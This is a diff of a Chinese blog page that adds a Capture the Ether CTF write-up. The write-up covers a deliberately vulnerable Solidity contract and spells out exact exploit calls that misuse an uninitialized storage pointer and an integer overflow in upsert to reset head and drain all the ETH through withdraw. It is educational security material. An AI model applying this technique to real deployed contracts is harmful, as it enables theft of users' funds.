class="built_in">require</span>(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + <span class="number">50</span> years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upsert</span>(<span class="params">uint256 index, uint256 timestamp</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            <span class="comment">// Update existing contribution amount without updating timestamp.</span></span><br><span class="line">            Contribution storage contribution = queue[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Append a new contribution. Require that each contribution unlock</span></span><br><span class="line">            <span class="comment">// at least 1 day after the previous one.</span></span><br><span class="line">            <span class="built_in">require</span>(timestamp &gt;= queue[queue.length - <span class="number">1</span>].unlockTimestamp + <span class="number">1</span> days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 index</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        <span class="built_in">require</span>(now &gt;= queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Withdraw this and any earlier contributions.</span></span><br><span class="line">        uint256 total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total += queue[i].amount;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Reclaim storage.</span></span><br><span class="line">            <span class="keyword">delete</span> queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Move the head of the queue forward so we don't have to loop over</span></span><br><span class="line">        <span class="comment">// already-withdrawn contributions.</span></span><br><span class="line">        head = index + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通关条件-5"><a href="#通关条件-5" class="headerlink" title="通关条件"></a>通关条件</h4><p>将合约中的 ETH 全部取走</p>
+<h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>蛮复杂的题。这个合约在 solidity 0.5.0 及以上版本中是编译不过的。非常明显的，upsert 函数中 else 代码块的 contribution 根本就没有声明……（佩服在 0.5.0 之前写 solidity 的大佬们）这个 contribution 同样是个未初始化的 Storage pointer，指向 slot 0。</p>
+<p>观察合约，注意以下事实：</p>
+<ol>
+<li>queue.length 存放于 slot 0</li>
+<li>head 存放于 slot 1</li>
+<li>else 代码块中的 contribution 会用 amount 覆盖 slot 0，修改 queue.length；会用 timestamp 覆盖 slot 1，修改 head。</li>
+<li>else 代码块中的 contribution 会被 push 到 queue 中去</li>
+<li>else 代码块中的 require 语句存在不安全的加法运算，timestamp + 1 days（即 24 * 60 * 60）有溢出的可能</li>
+</ol>
+<p>我们需要做的事有：</p>
+<ol>
+<li>构造特定的 contribution，其 unlockTimestamp 足够小，使得我们能通过 withdraw 函数的校验</li>
+<li>令 head 为 0，使得调用 withdraw 函数时可以将所有 contribution 资金都取出</li>
+<li>需要注意的是，contribution.timestamp 会覆盖 head，将 1 和 2 结合起来，我们的目的就是插入 timestamp 为 0 的 contribution</li>
+</ol>
+<p>初始化合约之后， queue.length 为 1， head 为 0，queue[0] 的 amount 为 1 ether，queue[0] 的 unlockTimestamp 为 now + 50 years，合约 ETH 余额为 1 ether。</p>
+<p>既然我们需要构建出一个 unlockTimestamp 为 0 的 contribution，在 upsert 函数中就显然不能走 if 代码块，而应该走 else 代码块。这就要求我们设法通过 else 代码块的 require 检验。结合上面的事实 5，考虑构建 contribution1，其 unlockTimestamp + 1 day 会溢出为 0。所以第一个调用为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index 在 else 代码块中用不到，可以随意设置</span></span><br><span class="line">contract.upsert(<span class="number">10</span>, <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span> - <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>还需要注意到，contribution 插入后，queue.length 应该为 2。我们的操作会导致存放 queue.length 的 slot 0 被覆盖，所以我们需要选择合适的 msg.value 使得 queue.length 为正确数值。我们转入的 msg.value 为 1 wei，由于执行 queue.push 的时候 slot 0 的数值会被加上 1，所以 slot 0 会变为 1 + 1 = 2，也就是说 queue.length 仍为 2。 但是这是又会发生一个问题：queue.push 之后，slot 0 和 slot 1 的数值作为 contribution 的 amount 和 timestamp 被复制到 queue[1] 中去了，所以 queue[1].amount 为 2 wei，比我们实际存入的要多了 1 wei。</p>
+<p>接下来我们再次调用 upsert 构建 contribution2：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// timestamp 设置为 0，等于 contribution1.unlockTimestamp + 1 days，可以通过 require 检查</span></span><br><span class="line">contract.upsert(<span class="number">10</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就得到了一个 timestamp 为 0 的 contribution（也就是说 head 为 0），此时已经可以通过 withdraw 来取款了。现在考虑 msg.value。如果我们转入 2 wei，则 queue.length 为正确数值 3，queue[2].amount 为 3 wei。我们总共转入 1 ether + 3 wei，而 queue 中三个 contribution 的 amount 分别为：</p>
+<ol>
+<li>queue[0].amount == 1 ether</li>
+<li>queue[1].amount == 2 wei</li>
+<li>queue[2].amount == 3 wei</li>
+</ol>
+<p>这样我们是无法将资金取干净的。</p>
+<p>但是如果我们转入 1 wei 的话，存入总金额为 1 ether + 2 wei，contribution 的情况如下：</p>
+<ol>
+<li>queue[0].amount == 1 ether</li>
+<li>queue[1].amount == 2 wei</li>
+<li>queue[2].amount == 2 wei（queue.length 为 2，所以无法正常访问到）</li>
+</ol>
+<p>此时我们只需要调用 <code>contract.withdraw(1)</code> 就可以取出合约内所有资金！这样操作的意义等同于我们将第二次的 1 wei 用来填补上次合约多增加的 1 wei。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/01/capturetheether-lotteries/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -886,7 +1110,7 @@
                 
                   <a href="/archives/%7C%7C%20archive">
                 
-                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-count">5</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
